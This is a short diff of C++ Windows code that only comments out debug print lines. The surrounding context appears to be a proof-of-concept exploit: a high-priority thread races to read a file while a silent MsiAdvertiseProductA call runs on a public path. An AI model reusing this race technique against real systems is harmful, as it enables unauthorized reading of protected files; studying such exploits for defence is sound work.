@@ -75,7 +75,7 @@ DWORD WINAPI MyThreadFunction(LPVOID lpParam)
 				hFile = CreateFile(dfc,GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);                
 				DWORD  dwBytesRead = 0;
 				ReadFile(hFile, buff, 400, &dwBytesRead, NULL);
-				std::cout << "3" << std::endl;
+				//std::cout << "3" << std::endl;
 				if (dwBytesRead > 0)
 				{
 					succeeded = true;
@@ -96,7 +96,7 @@ DWORD WINAPI MyThreadFunction(LPVOID lpParam)
 void runme() {
 	HANDLE mThread = CreateThread(NULL,0,MyThreadFunction,NULL,0,NULL);  
 	SetThreadPriority(mThread, THREAD_PRIORITY_TIME_CRITICAL);
-	std::cout << "2" << std::endl;
+	//std::cout << "2" << std::endl;
 }
 
 int main(int argc, const char * argv[])
@@ -131,7 +131,7 @@ int main(int argc, const char * argv[])
 		LANGID langid = 0x0409;
 		runme();
 		//Òþ²Ø°²×°
-		std::cout << "1" << std::endl;
+		//std::cout << "1" << std::endl;
 		MsiSetInternalUI(INSTALLUILEVEL_NONE, NULL);
 		MsiAdvertiseProductA(c, "C:\\Users\\Public\\blah\\test", NULL, langid);
 		
